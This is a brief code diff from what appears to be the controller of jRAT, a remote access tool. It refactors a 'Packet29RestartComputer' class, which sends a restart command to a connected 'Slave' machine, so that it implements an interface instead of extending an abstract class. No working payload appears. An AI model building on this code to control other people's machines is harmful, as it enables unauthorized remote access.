@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet29RestartComputer extends AbstractOutgoingPacket {
+public class Packet29RestartComputer implements OutgoingPacket {
 
 	@Override
 	public void write(Slave slave) throws Exception {
